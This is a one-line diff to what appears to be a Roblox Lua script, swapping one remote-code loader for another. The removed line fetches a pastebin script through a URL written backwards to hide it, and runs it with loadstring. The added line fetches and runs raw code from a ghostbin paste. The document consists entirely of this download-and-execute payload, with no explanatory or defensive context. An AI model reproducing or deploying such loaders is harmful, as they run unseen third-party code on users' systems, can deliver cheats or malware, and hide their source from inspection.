@@ -1,1 +1,1 @@
-script=loadstring(game:HttpGet(('ei9rQPRe/war/moc.nibetsap//:sptth'):reverse(), true))()
+loadstring(game:HttpGet('https://ghostbin.co/paste/ctpa/raw'))()
